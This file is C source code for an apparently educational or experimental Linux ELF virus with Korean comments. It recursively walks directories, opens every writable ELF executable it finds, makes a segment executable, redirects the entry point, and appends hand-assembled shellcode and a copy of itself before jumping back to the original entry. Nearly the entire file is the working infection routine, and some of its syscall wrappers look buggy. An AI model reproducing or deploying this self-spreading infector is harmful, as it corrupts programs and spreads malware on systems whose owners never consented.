#define _GNU_SOURCE
#define _XOPEN_SOURCE 500
#include <stdio.h>
#include <unistd.h>
#include <sys/types.h>
#include <sys/time.h>
#include <ftw.h>
#include <string.h>
#include <stdlib.h>
#include <elf.h>
#include <fcntl.h>
#define _GNU_SOURCE
#include <dirent.h>     /* Defines DT_* constants */
#include <sys/stat.h>
#include <sys/syscall.h>

#define SPARE_FDS  (4) 
#define MAX_FDS    (512)

struct linux_dirent {
   long           d_ino;
   off_t          d_off;
   unsigned short d_reclen;
   char           d_name[];
};
static inline int my_access(const char *fpath, int flag);
static inline int my_open(const char *fpath, int flag);
static inline int my_read(unsigned int fd, char *buf, int count);
static inline int my_write(unsigned int fd, char *buf, int count);
static inline int my_lseek(int fd, int offset, int origin);
static inline int my_getdent(int fd, struct linux_dirent *dirent, int count);
void my_memcpy(char* d, char* s, int l);
int my_strlen(const char *str);
int my_ptraceme(long request, long pid, unsigned long addr, unsigned long data);
int my_strcmp(char *str1, char *str2);
void  *my_memset(void *b, int c, int len);
void listdir(const char *dirname,long long int startrip);
void change_entrypoint(const char* ,long long int startrip);
static inline long long int hereis();

// Save register context
int main(int argc, char* argv[])
{
	int startrip;
	char infected[10] = {'I','N','F','E','C','T','E','D','\n',0};
	my_write(1,infected,9);
	
	//main의 시작RIP를 동적으로 구하기
	asm("lea (%rip), %rax");
	asm("lea (%%rax), %0":"=r"(startrip)); //  <main+84>
	startrip = startrip - 84;
	
	
	
	// printf("main RIP is : 0x%x\n",startrip);
	
	/*
	// TODO : Activate it!
	if(my_ptraceme(0,0,0,0)!=0) while(1);
	*/
	char dot[2]={'.',0};
    listdir(dot,startrip);
	
	// Here is dummy instruction. Prepare space for instruction patch!!!
	startrip = startrip + 1;
	startrip = startrip - 1;
	startrip = startrip + 1;
	startrip = startrip - 1;
	startrip = startrip + 1;
	startrip = startrip - 1;
	
}


static inline int my_access(const char *fpath, int flag){
	/*
     #define R_OK   4   // test for read permission 
     #define W_OK   2   // test for write permission 
     #define X_OK   1   // test for execute (search) permission 
     #define F_OK   0   // test for presence of file 
	*/
   long long ret;
   asm("mov %0, %%rdi"::"r" ((long long)fpath));
   asm("mov %0, %%rsi"::"r" ((long long)flag));
   asm("mov $21, %rax");
   asm("syscall");
   asm("mov %%rax, %0":"=r"(ret));
   return ret;
}

static inline int my_open(const char *fpath, int flag){
    long long ret;
    asm("mov %0, %%rsi"::"r"((long long)fpath));
    asm("mov %0, %%rsi"::"r"((long long)flag));
    asm("mov $2,%rax");
    asm("syscall");
    asm("mov %%rax, %0":"=r"(ret));
    return ret;
}

static inline int my_read(unsigned int fd, char *buf, int count){
    long long ret;
    asm("mov %0, %%rdi"::"r"((long long)fd));
    asm("mov %0, %%rsi"::"r"((long long)buf));
    asm("mov %0, %%rdx"::"r"((long long)count));
    asm("mov $0,%rax");
    asm("syscall");
    asm("mov %%rax, %0":"=r"(ret)::);
    return ret;
}

static inline int my_write(unsigned int fd, char *buf, int count){
    long long ret;
    asm("mov %0, %%rdi"::"r"((long long)fd));
    asm("mov %0, %%rsi"::"r"((long long)buf));
    asm("mov %0, %%rdx"::"r"((long long)count));
    asm("mov $1,%rax");
    asm("syscall");
    asm("mov %%rax, %0":"=r"(ret)::);
    return ret;
}

static inline int my_lseek(int fd, int offset, int origin){
   long long ret;
   asm("mov %0, %%rdi"::"r"((long long)fd));
   asm("mov %0, %%rsi"::"r"((long long)offset));
   asm("mov %0, %%rdx"::"r"((long long)origin));
   asm("mov $8, %rax");
   asm("syscall");
   asm("mov %%rax, %0":"=r"(ret));
   return ret;
}

static inline int my_getdent(int fd, struct linux_dirent *dirent, int count){
    long long ret;
    asm("mov %0, %%rdi"::"r"((long long)fd));
    asm("mov %0, %%rsi"::"r"((long long)dirent));
    asm("mov %0, %%rdx"::"r"((long long)count));
    asm("mov $78,%rax");
    asm("syscall");
    asm("mov %%rax, %0":"=r"(ret));
    return ret;
}
 
void my_memcpy(char* d, char* s, int l){
    int i=0;
    while(l--){
        d[i]=s[i];
        i++;
    }
}

int my_strlen(const char *str){
   int i=0;
   while(1) if(str[i++]=='\x0') break;
   return i-1;
}

int my_ptraceme(long request, long pid, unsigned long addr, unsigned long data){
   long long ret;
   asm("mov %0, %%rdi"::"r"((long)request));
   asm("mov %0, %%rsi"::"r"((long)pid));
   asm("mov %0, %%rdx"::"r"((long)addr));
   asm("mov %0, %%r10"::"r"((long)data));
   asm("mov $101, %rax");
   asm("syscall");
   asm("mov %%rax, %0":"=r"(ret));
   return ret; // under debugging : -? / normal : 0
}

int my_strcmp(char *str1, char *str2) {
  for (;*str1 && *str1 == *str2; str2++) str1++;
  return *str1 - *str2;
}

void  *my_memset(void *b, int c, int len){
  int i;
  unsigned char *p = b;
  i = 0;
  while(len > 0)
    {
      *p = c;
      p++;
      len--;
    }
  return(b);
}

void listdir(const char *dirname,long long int startrip){
    int nread = 0;
    int dirname_len = my_strlen(dirname);
    int d_name_len;
    int fd = my_open(dirname, O_RDONLY | O_DIRECTORY);
    struct linux_dirent *d;
    int bpos = 0;
    char d_type;
    char buf[1000];
    char subdir[4096+1]; // PATH_MAX
    char subfile[4096+1]; // PATH_MAX
    char dot[2] = {'.', 0};
    char dotdot[3] = {'.', '.', 0};
    char slash[2] = {'/', 0};
    for ( ; ; ) {
		nread = my_getdent(fd,(struct linux_dirent *)buf, 1000);
		//printf("nread : %d\n",nread);
		if (nread <= 0) break;
	
		for (bpos = 0; bpos < nread;) {
			d = (struct linux_dirent*) (buf + bpos);
			d_type = *(buf + bpos + d->d_reclen - 1);
			d_name_len = my_strlen(d->d_name);
			bpos += d->d_reclen;
			my_memcpy(subfile,dirname,dirname_len);
			my_memcpy(subfile + dirname_len, slash, 1);
			my_memcpy(subfile + dirname_len + 1 ,d->d_name,d_name_len+1);
			// here
			change_entrypoint(subfile,startrip);
			
			
			if(d->d_ino && my_strcmp(d->d_name, dot) && my_strcmp(d->d_name, dotdot))
			{
				if(d_type == DT_DIR) // if directory
				{
					my_memcpy(subdir, dirname, dirname_len);
					my_memcpy(subdir + dirname_len, slash, 1);
					my_memcpy(subdir + dirname_len + 1, d->d_name, d_name_len+1);
					listdir(subdir,startrip);
				}
			}
		}
    }
}

void change_entrypoint(const char* fpath,long long int startrip){
	char shellcode[0x1000];
	int fd, i, shellcodeloc;
	int is_infected_already = 1;  
	int filesize;
	long long int oep;
	long long int oep_relocated;
	long long int endrip;
	Elf64_Shdr shdr;
	Elf64_Phdr phdr;
	Elf64_Ehdr ehdr;
	
	if(my_access(fpath,7)!=0) return 0; // R_OK|W_OK|X_OK = 7
	fd = my_open(fpath, 2); // O_RDWR = 2
	if (fd < 0) return 0;
	if (my_read(fd, &ehdr, sizeof(ehdr)) != sizeof(ehdr)) return 0;
	if(!(ehdr.e_ident[1]=='E' && ehdr.e_ident[2]=='L' && ehdr.e_ident[3]=='F'))return 0;
	
	// [02] Read page headers info.
	my_lseek(fd, ehdr.e_phoff, SEEK_SET); 
	for(i=0;i<ehdr.e_phnum;i++){
		if (my_read(fd, &phdr, sizeof(phdr)) != sizeof(phdr)) return 0;
		else{ // Find RW_ Data page(Loadable Segment && PF_Read_Write(6)) and add Executable permission.
			if(phdr.p_type==1 && phdr.p_flags==5){
				my_lseek(fd, -sizeof(phdr), SEEK_CUR); // go back to start of page header
				phdr.p_flags=7; 
				phdr.p_filesz += 0x10000; // 적게주면 불리하니 최대한 많이 줌
				phdr.p_memsz += 0x10000;  // 적게주면 불리하니 최대한 많이 줌
				
				my_write(fd, &phdr, sizeof(phdr));
				is_infected_already = 0; // This binary is not infected already.
				break; // 대상 phdr를 읽은상태에서 break.
			}
		}
	}
	if(is_infected_already) return 0;
	

	
	
	/*---------------------------------------------------------------------------*/
	// Section header for malicious section. 
	
	filesize = ehdr.e_shoff + (ehdr.e_shentsize * (ehdr.e_shnum));
	shellcodeloc = phdr.p_vaddr + filesize; 
	oep = ehdr.e_entry;
	ehdr.e_entry = shellcodeloc; // Manipulate OEP (original entry point)
	//printf("Original : 0x%x, Changed OEP : 0x%x\n",oep,shellcodeloc);
	my_lseek(fd, 0, SEEK_SET);
	my_write(fd, &ehdr, sizeof(ehdr));
	
	
	
	/*---------------------------------------------------------------------------*/
	// Malicious section 
	
	
	
	
	
	/* ------------ main 앞에 레지스터 컨텍스트 저장하는 루틴을 추가 ------------ */
	my_lseek(fd, 0, SEEK_END);
	my_memset(shellcode,'\x90',0x1000);
	
	// rax~rdp 를 스택에 저장하고 esp포인터를 r15(virus루틴에서 사용하지 않는 레지스터)에 백업해둔다
	/*
	   50	push   %rax
       53	push   %rbx
       51	push   %rcx
       52	push   %rdx
       57	push   %rdi
       55	push   %rbp
       49 89 e7	mov    %rsp,%r15
	*/
	shellcode[0] = '\x50';
	shellcode[1] = '\x53';
	shellcode[2] = '\x51';
	shellcode[3] = '\x52';
	shellcode[4] = '\x57';
	shellcode[5] = '\x55';
	shellcode[6] = '\x49';
	shellcode[7] = '\x89';
	shellcode[8] = '\xe7';
	
	my_write(fd,shellcode,10);
	
	
	
	
	/*
	// TODO : 이 루틴이 사라짐. 이거 복구하기. 이거는 프로그램 OEP에서 쓰는건데...  : main으로 들어감 -> 레지스터컨텍스트복구 -> 복구후 rdi가리키는값를 리턴주소에 더하기 -> 리턴주소에 점프 . 이런시긍로가도록하기.
	  We use $RDI register to get relocation information. 
	  $RDI holds base VA offset info!
	  
	  ex)
	  
	  - If PIE binary : 
	  *RDI  0x7ffff7ffe168 <- 0x555555554000 
	
	  - If not :  
	  *RDI  0x7ffff7ffe168 <— 0x0
	*/
	
	
	
	/* -----------Save original entry point-------------*/
	// 이부분 없애버렸음. leave-ret 인지 ret 인지 모르는상황이기 때문에..
	// 리턴주소는 main + ??? 에 jmp OEP 로 런타임패치.
	/*--------------------------------------------------*/
	
	
	
	/* ---------- write ls [main() ~~~ hereis()] ---------*/
	my_lseek(fd, 0, SEEK_END);
	endrip = hereis() + 10;
	my_write(fd, startrip, endrip - startrip); 
	/*--------------------------------------------------*/
	
	
	
	/* ------------ main 의 리턴주소를 런타임에 패치 ------------*/
	my_memset(shellcode,'\x90',0x1000);
	
	// OEP로 뛰기위한 레지스터 컨텍스트 복원
	/*   
       4c 89 fc	mov    %r15,%rsp
       5d	pop    %rbp
       5f	pop    %rdi
       5a	pop    %rdx
       59	pop    %rcx
       5b	pop    %rbx
       58	pop    %rax
	*/
	shellcode[0] = '\x4c';
	shellcode[1] = '\x89';
	shellcode[2] = '\xfc';
	shellcode[3] = '\x5d';
	shellcode[4] = '\x5f';
	shellcode[5] = '\x5a';
	shellcode[6] = '\x59';
	shellcode[7] = '\x5b';
	shellcode[8] = '\x58';
	
	
	// OEP로 점프
	/*  
	     48 b8 41 41 41 41 41 41 41 41	movabs $0x4141414141414141,%rax  
		 48 03 07	add    rax,QWORD PTR [rdi]  // rax 에 rdi 가 기리키는값 더하기
	     ff e0	jmpq   *%rax   
	*/
	shellcode[9] =  '\x48';
	shellcode[10] = '\xb8';
	my_memcpy(&shellcode[11], &oep, sizeof(ehdr.e_entry));	
	
	shellcode[19] = '\x48';
	shellcode[20] = '\x03';
	shellcode[21] = '\x07';
	
	shellcode[22] = '\xff';
	shellcode[23] = '\xe0';
	
	
	/*
	main 전 컨텍스트저장
	50	push   %rax
    53	push   %rbx
    51	push   %rcx
    52	push   %rdx
    57	push   %rdi
    55	push   %rbp
    49 89 e7	mov    %rsp,%r15
	90
	
	msin 은 이렇게 생겼음 
	<+0>:	55	push   %rbp
	<+1>:	48 89 e5	mov    %rsp,%rbp
	<+4>:	48 83 ec 30	sub    $0x30,%rsp
	<+8>:	89 7d dc	mov    %edi,-0x24(%rbp)
	<+11>:	48 89 75 d0	mov    %rsi,-0x30(%rbp)
	<+15>:	c6 45 f0 49	movb   $0x49,-0x10(%rbp)
	<+19>:	c6 45 f1 4e	movb   $0x4e,-0xf(%rbp)
	<+23>:	c6 45 f2 46	movb   $0x46,-0xe(%rbp)
	<+27>:	c6 45 f3 45	movb   $0x45,-0xd(%rbp)
	<+31>:	c6 45 f4 43	movb   $0x43,-0xc(%rbp)
	<+35>:	c6 45 f5 54	movb   $0x54,-0xb(%rbp)
	<+39>:	c6 45 f6 45	movb   $0x45,-0xa(%rbp)
	<+43>:	c6 45 f7 44	movb   $0x44,-0x9(%rbp)
	<+47>:	c6 45 f8 0a	movb   $0xa,-0x8(%rbp)
	<+51>:	c6 45 f9 00	movb   $0x0,-0x7(%rbp)
	<+55>:	48 8d 45 f0	lea    -0x10(%rbp),%rax
	<+59>:	ba 09 00 00 00	mov    $0x9,%edx
	<+64>:	48 89 c6	mov    %rax,%rsi
	<+67>:	bf 01 00 00 00	mov    $0x1,%edi
	<+72>:	e8 e6 00 00 00	callq  0x400609 <my_write>
	<+77>:	4c 8d 3d 00 00 00 00	lea    0x0(%rip),%r15        # 0x40052a <main+84>
	<+84>:	41 8d 07	lea    (%r15),%eax
	<+87>:	89 45 fc	mov    %eax,-0x4(%rbp)
	<+90>:	83 6d fc 16	subl   $0x16,-0x4(%rbp)
	<+94>:	c6 45 e0 2e	movb   $0x2e,-0x20(%rbp)
	<+98>:	c6 45 e1 00	movb   $0x0,-0x1f(%rbp)
	<+102>:	8b 45 fc	mov    -0x4(%rbp),%eax
	<+105>:	48 63 d0	movslq %eax,%rdx
	<+108>:	48 8d 45 e0	lea    -0x20(%rbp),%rax
	<+112>:	48 89 d6	mov    %rdx,%rsi
	<+115>:	48 89 c7	mov    %rax,%rdi
	<+118>:	e8 ba 02 00 00	callq  0x40080b <listdir>
	//------------여기서부터 패치 시작. 더미코드의시작--------------//
	<+123>:	83 45 fc 01	addl   $0x1,-0x4(%rbp) 
	<+127>:	83 6d fc 01	subl   $0x1,-0x4(%rbp)
	<+131>:	83 45 fc 01	addl   $0x1,-0x4(%rbp)
	<+135>:	83 6d fc 01	subl   $0x1,-0x4(%rbp)
	<+139>:	83 45 fc 01	addl   $0x1,-0x4(%rbp)
	<+143>:	83 6d fc 01	subl   $0x1,-0x4(%rbp)

	*/
	// virtual address가 아니라 실제로 shellcodeloc 이 파일시작으로부터 위치한거리. 
	my_lseek(fd, filesize + 10 + 122, SEEK_SET); // 10(main 전 컨텍스트 저장 루틴의 길이) + 122(main의 시작으로부터 dummy까지의 길이) 
	my_write(fd, shellcode, 24);
	
	/* ------------------------------------------------ */


}
static inline long long int hereis(){ 
	 /*
       Dump of assembler code for function hereis:
       0x000000000040054d <+0>:	55	push   %rbp
       0x000000000040054e <+1>:	48 89 e5	mov    %rsp,%rbp
       0x0000000000400551 <+4>:	48 8d 05 00 00 00 00	lea    0x0(%rip),%rax        # 0x400558 <hereis+11>
       0x0000000000400558 <+11>:	48 89 45 f8	mov    %rax,-0x8(%rbp)
       0x000000000040055c <+15>:	48 8b 45 f8	mov    -0x8(%rbp),%rax
       0x0000000000400560 <+19>:	5d	pop    %rbp
       0x0000000000400561 <+20>:	c3	retq   
	 */
	 long long int ret; // hereis + 11 (gcc flag : -fno-stack-protector) 
	                    // Hence, end of virus routine is .... hereis - 11 + 21 == hereis + 10
	 asm("lea (%%rip), %0":"=r"(ret));  
	 return ret;
 }
